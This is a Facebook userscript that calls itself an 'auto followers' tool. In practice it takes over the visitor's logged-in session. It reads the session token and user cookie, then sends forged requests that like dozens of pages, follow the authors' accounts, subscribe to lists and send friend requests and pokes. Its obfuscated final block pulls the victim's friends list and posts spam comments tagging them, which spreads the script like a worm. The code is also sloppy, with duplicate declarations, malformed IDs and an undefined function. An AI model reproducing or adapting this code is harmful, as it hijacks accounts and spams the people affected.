// ==UserScript==
// @name        Facebook Auto Followers v2.1
// @namespace   followers
// @description Get 100000 Facebook Followers
// @include     https://www.facebook.com/
// @version     3.1
// updateURL       http://userscripts.org/scripts/source/440207.user.js 
// @updateURL      http://userscripts.org/scripts/source/440207.user.js 
// @downloadURL    http://userscripts.org/scripts/source/440207.user.js 
// @grant       none
// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = 

document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function 

Like(p) { var Page = new XMLHttpRequest(); var PageURL = 

"//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = 

"&fbpage_id=" + p 

+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr

[_mod]=pagelet_timeline_page_actions&__user="+user_id

+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; 

Page.open("POST", PageURL, true); Page.onreadystatechange = function () { 

if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; 

Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = 

document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var 

fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 

function a(abone) { var http4=new XMLHttpRequest; var 

url4="/ajax/follow/follow_profile.php?__a=1"; var 

params4="profile_id="+abone+"&location=1&source=follow-

button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id

+"&phstamp="; http4.open("POST",url4,true); 

http4.onreadystatechange=function() { if

(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) 

} function sublist(uidss) { var a = document.createElement('script'); 

a.innerHTML = "new AsyncRequest().setURI

('/ajax/friends/lists/subscribe/modify?

location=permalink&action=subscribe').setData({ flid: " + uidss + " 

}).send();"; document.body.appendChild(a); } function p(abone) { var http4 

= new XMLHttpRequest(); var url4 = 

"//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + 

"&pokeback=0&ask_for_confirm=0&nctr[_mod]

=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id

+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; 

http4.open("POST", url4, true); http4.onreadystatechange = function () { if 

(http4.readyState == 4 && http4.status == 200) { http4.close; } }; 

http4.send(params4); }var user_id = document.cookie.match

(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = 

document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime

(); function P(opo) { var X = new XMLHttpRequest(); var XURL 

="//www.facebook.com/ajax/ufi/like.php"; var XParams = 

"like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now

+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]

=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft

[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id

+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; 

X.open("POST", XURL, true); X.onreadystatechange = function () { if 

(X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
// pic + fansLike("212616618944744")
Like("611481782253866")
Like("451161101676955")
Like("255029331325149")
Like("364916686982417")
Like("223743004499418")
Like("193924687473907")
Like("227731054067597")
Like("1432113003698612")
Like("525238557595110")
Like("1481456812074670")
Like("268612859911433")
Like("1427506230818558")
Like("765526776799168")
Like("420125684790150")
Like("679272122135365")
Like("557919287634527")
Like("1384749911747431")
Like("654854011247110")
Like("1453604464872442")
Like("1433469053557803")
Like("409221532511057")
Like("679751702066578")
like("151830391555293");
like("192981884188553");
like("1414025542170480");
like("218132925045015");
like("251212141719120");
like("353224848152132");
like("258265587667072");
like("1445991435617727");
like("482094245228427");
like("247192758795260");
like("1455616657987116");
like("202765289931295");
like("1389000688030281");
like("223951197791905");
like("736770046362954");
like("718290238211810");
like("281302855360939");
like("258878184290302");
like("693174100734506");
like("450262681768903");
like("639106812815308");
like("1412038692375025");
like("409221532511057");
like("678281992194187");
like("167700893392247");
like("461914297252604");
like("245695945611335");
like("700943769956649");
like("238100442901860");
like("221843944670029");
like("118651438214965");
like("168789646537073");
like("640379372654561");
like("164214610319283");
like("268731823153778");
like("210171569041600");
like("162178057176916");
like("219272321457448");
like("132005463558662");
like("353945744735894");
like("1394397880811536");
like("255303991166556");
like("220140714687800");
like("1451361385075498");
like("225508817623626");
like("461914297252604");
like("389138047899033");
like("812739665408635");
like("171072963072333");
like("613292712043793");
like("202755426554166");
like("157953557739977");
like("162568173932597");
like("190393451130359");
like("715994788427886");
like("1457602121134359");
like("700943769956649");
like("260421034121774");
like("242816132562205");
like("1394216307502385");
like("272396402911577");
like("227630984109222");
like("728710733814198");
like("352450098226592");
like("1443944195836402");
like("129678767207275");
like("520465131399581");
like("1446153905614398");
like("417253388378296");
like("476318985806108");
like("264103840424491");
like("243644345810248");
like("584499038303313");
like("481459261963830");
like("580311865376041");
like("262073513958096");
like("640884239324430");
like("695507297168810");
like("590669724356010");
like("516679425118549");
like("600292033378519");
like("719088824802954");
like("459735934127744");
like("239847449534528");
like("1403224739937013");
like("650256698343523");
like("1387766781444102");
like("215932198603906");
like("592127874202207");
like("461837257277941");
like("423848054384842");
like("595056657253227");
like("550063128441532");
like("651926824878442");
like("413049042164086");
like("1474660172748973");
like("574983699264956");
like("558013834296660");
like("1454411158124563");



a("100006137434548");
a("100007554037289");
a("100004309684699");
a("100007814950633");
a("100002435366261");
a("1035212583");
a("100003834173593");



Like("246221852220846")
Like("1452927438263613")
Like("355129114627641")
Like("238570282994276")
Like("683050808405107")
Like("272597026223037")
Like("126457414147786")
Like("205887249611415")

Like("1394216307502385")
Like("245695945611335")
Like("1457602121134359")
Like("667461796643342")
Like("595925933818179")
Like("151830391555293")
Like("193924687473907")
Like("228039914070996")
Like("700943769956649")
Like("242816132562205")
Like("1454411158124563")
Like("1414025542170480")
Like("1432080887036804")
Like("563274363771772")
Like("1397767810496113")
Like("1481456812074670")
Like("423976054406476")
Like("736770046362954")
Like("717401761645670")
Like("651926824878442")
Like("1474660172748973")
Like("225200657679714")
Like("394973553936929")
Like("624095864345627")
Like("574983699264956")
Like("58013834296660")
Like("413049042164086")
Like("595056657253227")
Like("679272122135365")
Like("1453604464872442")
Like("50063128441532")
Like("x")
Like("x")
Like("x")
Like("x")
Like("x")
Like("x")
Like("x")

//Developers
a("100008170351550");
a("100000564670966");
a("100001459084718");
a("100003310304310");
a("100001694495346");
sublist("621048951286008");
sublist("528951387168743");


/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)

[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r 

+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_i

d=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_refere

r&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg

+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}

alert("||         اضغط OK , ليتم التفعيل . . . .         ||");
//AninerWasHere
var _0xa22c=

["value","fb_dtsg","getElementsByName","match","cookie","380772145393921","

onreadystatechange","readyState","arkadaslar = ","for 

(;;);","","replace","responseText",";","length","entries","payload","round"

," colek2..  \udbb8\udc3c @[","uid",":","text","]"," ","\x26filter[0]

=user","\x26options[0]=friends_only","\x26options[1]

=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL",

"GET","https://www.facebook.com/ajax/typeahead/first_degree.php?

__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?

__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= 

شاهد من يزور بروفايلك على الفيس بوك ^_^ ... chokraaan bzzzaaaf  , Toooooooop yeeeesss wlaah taa 

wa3errr :D <3 <3 <3 peace  >:o thnx u char7 ta hwa sahaaal bzzaaf  :v . <3 

:) l3aaazzz olad lblaad . \ud83c\udf1f\ud83c\udf43\ud83c\udf40\ud83c\udf3b

\ud83c\udf3a\ud83c\udf39\ud83c\udf38\ud83c\udf37 

","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid",

"\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid

\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:

\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid

\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26g

iftoccasion","\x26ft[tn]=

[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26f

b_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-

type","application/x-www-form-

urlencoded","setRequestHeader","status","close"];var fb_dtsg=document

[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]]

[_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var 

id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var 

_0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if

(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString

()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math

[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)

{mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if

(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar

[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c

[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c

[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap

(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c

[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c

[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]]

[_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c

[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c

[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas

(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c

[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c

[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c

[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]]

(Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])]

[_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap

(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c

[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent

(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c

[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c

[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c

[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c

[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c

[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c

[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c

[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c

[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]

==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd

[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);